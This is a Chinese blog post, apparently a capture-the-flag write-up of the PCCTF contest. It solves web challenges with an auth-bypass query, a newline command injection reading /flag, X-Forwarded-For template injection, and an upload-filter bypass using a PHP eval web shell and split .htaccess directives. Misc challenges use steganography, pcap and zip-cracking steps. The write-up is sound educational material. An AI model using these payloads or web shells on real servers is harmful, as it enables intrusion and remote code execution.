@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>PCCTF | 栈桥仔</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WEBWEB 1打开页面 发现红框处有变量覆盖漏洞  这样就可以构造payload，其中的哈希值必须和key值相等， 1?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3  页面返回flag，提交即可  Web 2打">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PCCTF">
+<meta property="og:url" content="https://zhanqiaozai.github.io/2020/07/25/PCCTF/index.html">
+<meta property="og:site_name" content="栈桥仔">
+<meta property="og:description" content="WEBWEB 1打开页面 发现红框处有变量覆盖漏洞  这样就可以构造payload，其中的哈希值必须和key值相等， 1?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3  页面返回flag，提交即可  Web 2打">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623185822894.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190004841.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190247326.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191410721.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191507011.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191638876.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192136007.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192339991.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192434867.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192842390.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623193133965.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624174852857.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175111252.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175206630.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175606289.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181119337.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181150594.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181337565.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181325574.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181500902.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181712766.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181842175.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624183053319.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624190337357.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101521740.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101540691.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101732644.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101944681.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102150125.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102327688.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102424165.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102439432.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102824080.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102857932.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103024275.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103154968.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103231143.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103247827.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103352901.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103508433.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103817559.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103927816.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104045743.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104151978.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104401280.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104454771.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191412085.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191451270.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191652380.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191712691.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191937299.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192011347.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192107665.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192359239.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192449724.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192530397.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192702483.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192824329.png">
+<meta property="article:published_time" content="2020-07-25T01:17:06.969Z">
+<meta property="article:modified_time" content="2020-06-25T11:28:26.616Z">
+<meta property="article:author" content="zhanqiaozai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623185822894.png">
+  
+    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zhanqiaozai</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-PCCTF" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/PCCTF/" class="article-date">
+  	<time datetime="2020-07-25T01:17:06.969Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PCCTF
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h4><p>打开页面</p>
+<p>发现红框处有变量覆盖漏洞</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623185822894.png" alt="image-20200623185822894"></p>
+<p>这样就可以构造payload，其中的哈希值必须和key值相等，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3</span><br></pre></td></tr></table></figure>
+
+<p>页面返回flag，提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190004841.png" alt="image-20200623190004841"></p>
+<h4 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h4><p>打开页面</p>
+<p>红框处使用chr()函数</p>
+<p>chr()函数的处理方式是将<code>w3lc0me_To_PCCTF</code>的每一个值转换成ascii然后每一个值得ascii+256，</p>
+<p>还有intval函数的值需要进行绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190247326.png" alt="image-20200623190247326"></p>
+<p>intval()函数在处理16进制时存在问题,但强制转换时是正常的 来绕过第二个判断，intval(字符串)为0  但是intval(字符串+1) 会自动转换成数值，不过php7已经修复了，这里我们传入password的参数<code>6e4</code></p>
+<p>payload：<code>&amp;password=6e4&amp;value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=336&amp;value[12]=323&amp;value[13]=323&amp;value[14]=340&amp;value[15]=326</code></p>
+<p>这样就成功的返回了flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191410721.png" alt="image-20200623191410721"></p>
+<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开页面，</p>
+<p>发现过滤了很多符号，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191507011.png" alt="image-20200623191507011"></p>
+<p>而且可以看到底下可以ping IP，这样就可以联想到命令执行漏洞，但是上面吧符号都给过滤了，所以没办法使用上面的符号进行命令执行，但是发现并没有过滤<code>%0a</code>，可以尝试一下这个命令</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191638876.png" alt="image-20200623191638876"></p>
+<p>这样构造的payload：<code>?ip=127.0.0.1%0acat /flag</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192136007.png" alt="image-20200623192136007"></p>
+<h4 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h4><p>打开页面</p>
+<p>发现左上角有一个flag，hint，看看flag有什么</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192339991.png" alt="image-20200623192339991"></p>
+<p>发现flag里面说我们的ip是<code>39.77.85.15</code>第一时间就是想到伪造IP，X-Forwarded-For</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192434867.png" alt="image-20200623192434867"></p>
+<p>使用burp进行抓包然后进行伪造IP看看返回什么值，伪造ip之后经过测试发现伪造的IP是可变的，这里想到XFF的SSTI注入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192842390.png" alt="image-20200623192842390"></p>
+<p>然后构造一下XFF的伪造ip，发现成功返回了flag，复制提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623193133965.png" alt="image-20200623193133965"></p>
+<h4 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h4><p>打开页面</p>
+<p>一看就是文件上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624174852857.png" alt="image-20200624174852857"></p>
+<p>上传构造一句话，然后上传，上传php文件发现返回文件名称错误，说明不能上传php文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175111252.png" alt="image-20200624175111252"></p>
+<p>所以我们需要构造图片码试试，过滤了以下内容，可以看到<code>&gt;</code>括号被过滤了，ph被过滤了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175206630.png" alt="image-20200624175206630"></p>
+<p>所以我们就要构造一个没有<code>&gt;</code>的payload</p>
+<p>以下的payload就没有<code>&gt;</code>尖括号，再次进行上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST[123]);</span><br></pre></td></tr></table></figure>
+
+<p>发现这样就成功上传了，但是直接连接的话是连接不上的，会报错的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175606289.png" alt="image-20200624175606289"></p>
+<p>所以想到上传.user.ini，但是发现过滤了auto这样就不能上传.user.ini了，想到还有一个.htaccess，不过是利用htaccess的特性，开启php的short_open_tag支持。</p>
+<p>上传的时候需要修改content-type后可以上传.htaccess。自然而然想到上传内容为如下的.htaccess文件修改apache配置，将jpg按php解释执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>但是ph被过滤了，如果直接上传会报错，</p>
+<p>这里可以使用apache配置文件的多行模式，将一行配置拆为多行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
+
+<p>由于php的执行还需要&lt;?php ，所以需要开启short_open_tag。用同样的办法写好。</p>
+<p>最终 .htaccess 的写法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddTyppe application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg\</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag on</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>这里的 .htaccess中的<code>.</code> 前面不能加任何东西，比如：1.htaccess</p>
+<p>然后进行最终上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181119337.png" alt="image-20200624181119337"></p>
+<p>然后放行这个包，这样查看页面就显示成功上传了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181150594.png" alt="image-20200624181150594"></p>
+<p>图片码直接上传即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181337565.png" alt="image-20200624181337565"></p>
+<p>构造URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;uploads&#x2F;9465e99a7262f75468c0dc54c4f76954&#x2F;sss.jg</span><br></pre></td></tr></table></figure>
+
+<p>使用蚁剑连接，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181325574.png" alt="image-20200624181325574"></p>
+<p>点击根目录，找到flag文件，双击打开，flag就在其中了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181500902.png" alt="image-20200624181500902"></p>
+<h3 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h3><h4 id="Don’t-wait"><a href="#Don’t-wait" class="headerlink" title="Don’t wait!"></a>Don’t wait!</h4><p>点击题目，发现让我们下载一个文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181712766.png" alt="image-20200624181712766"></p>
+<p>先进行下载，下载完进行解压，是一个exe后缀的应用</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181842175.png" alt="image-20200624181842175"></p>
+<p>打开看看</p>
+<p>等了好长一段时间发现，发现返回了flag，但是这种办法是非常非常非常慢的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624183053319.png" alt="image-20200624183053319"></p>
+<p>我们将exe改为txt，然后进行搜索flag就能获得了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624190337357.png" alt="image-20200624190337357"></p>
+<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>按照要求关注就行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101521740.png" alt="image-20200625101521740"></p>
+<h3 id="F-k"><a href="#F-k" class="headerlink" title="F**k"></a>F**k</h3><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101540691.png" alt="image-20200625101540691"></p>
+<p>需要下载一个apk文件，进行下载</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101732644.png" alt="image-20200625101732644"></p>
+<p>因为是zip文件，进行解压，解压完得到了这个文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101944681.png" alt="image-20200625101944681"></p>
+<p>这里使用010Editor来查看他的16进制，往下拉，会发现许多这种密文，将这些密文全部复制</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102150125.png" alt="image-20200625102150125"></p>
+<p>打开URL的控制台，然后粘贴上去，按一下回车，就成功的显示出flag来了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102327688.png" alt="image-20200625102327688"></p>
+<h3 id="比签到还水"><a href="#比签到还水" class="headerlink" title="比签到还水"></a>比签到还水</h3><p>打开网址看看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102424165.png" alt="image-20200625102424165"></p>
+<p>需要下载一个zip压缩包，进行下载</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102439432.png" alt="image-20200625102439432"></p>
+<p>下载完如果直接打开，会报错。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102824080.png" alt="image-20200625102824080"></p>
+<p>这样我们使用binwalk看看有没有隐藏文件</p>
+<p>可以看到有一个隐藏图片，我们进行分离出来</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102857932.png" alt="image-20200625102857932"></p>
+<p>使用<code>binwalk -e 文件名</code>，发现这并不是我们要的文件，这时候就想到了，可能不能使用binwalk进行分离，试试foremost</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103024275.png" alt="image-20200625103024275"></p>
+<p>命令：<code>foremost 文件名 -o 自己设置文件名</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103154968.png" alt="image-20200625103154968"></p>
+<p>我们设置的输出文件名是123.这时候桌面就多出了123文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103231143.png" alt="image-20200625103231143"></p>
+<p>打开看看有没有我们需要的，分离出一个二维码，直接扫一下就行了，就返回flag了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103247827.png" alt="image-20200625103247827"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103352901.png" alt="image-20200625103352901"></p>
+<h3 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h3><p>可以看到提示是用wireshark来分析</p>
+<p>下载文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103508433.png" alt="image-20200625103508433"></p>
+<p>下载完之后使用wireshark打开文件</p>
+<p>随便点击一个协议，进行追踪流</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103817559.png" alt="image-20200625103817559"></p>
+<p>右键，追踪流，右键什么协议就追踪什么流，</p>
+<p>我们右键的是TCP所以追踪TCP流</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625103927816.png" alt="image-20200625103927816"></p>
+<p>发现里面有很多编码，其实都经过尝试了，都是没用的，往下划，看看有没有有用的信息</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104045743.png" alt="image-20200625104045743"></p>
+<p>可以看到这一大串中在z1后是16进制，文件头是ZIP的，所以我们复制z1后的16进制</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104151978.png" alt="image-20200625104151978"></p>
+<p>复制完之后在010Editor中粘贴</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104401280.png" alt="image-20200625104401280"></p>
+<p>另存为ZIP文件，然后进行解压，成功返回了二维码，扫描一下即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625104454771.png" alt="image-20200625104454771"></p>
+<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>下载文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191412085.png" alt="image-20200625191412085"></p>
+<p>打开发现是个游戏，要坚持60s不死，就会返回flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191451270.png" alt="image-20200625191451270"></p>
+<p>当我们放大这个游戏的时候，发现旁边是空白的，然后我们可以移动到空白的地方。这是树叶方块碰不到，然后等60s在出来死掉就出现flag了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191652380.png" alt="image-20200625191652380"></p>
+<p>这样就出现flag了，这是一种方法。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191712691.png" alt="image-20200625191712691"></p>
+<p>还有一种方法</p>
+<p>使用binwalk查看隐藏内容，发现有很多</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625191937299.png" alt="image-20200625191937299"></p>
+<p>然后将其分离出来，我们这里使用的是foremost</p>
+<p>分离出两个文件，一个是GIF里面全是图片没有什么值得关注的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192011347.png" alt="image-20200625192011347"></p>
+<p>但是在zip文件中有一个压缩包，进行解压，然后进去得到三个文件夹</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192107665.png" alt="image-20200625192107665"></p>
+<p>image文件夹，也是图片没有用，这样就剩下两个文件夹了，经过测试我们发现flag在cn\bjsxt\plane下的PlaneGameFrame.class里面</p>
+<p>打开该文本，搜索flag，就找到了，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192359239.png" alt="image-20200625192359239"></p>
+<h3 id="fuck-4"><a href="#fuck-4" class="headerlink" title="fuck_4"></a>fuck_4</h3><p>打开网页需要下载一个zip的文件，下载下来</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192449724.png" alt="image-20200625192449724"></p>
+<p>下载完成后打开，发现有一个flag文本，打开看看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192530397.png" alt="image-20200625192530397"></p>
+<p>打开后发现需要输入文件密码，我们不知道密码，然后使用ARCHPR进行爆破一下，这样成功得到密码。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192702483.png" alt="image-20200625192702483"></p>
+<p>将密码输入，打开文件，这样就成功得到了密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625192824329.png" alt="image-20200625192824329"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/25/BUUCTF%E9%A2%98/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          BUUCTF题
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">神马培训</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="PCCTF" data-title="PCCTF" data-url="https://zhanqiaozai.github.io/2020/07/25/PCCTF/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="PCCTF">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 zhanqiaozai
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
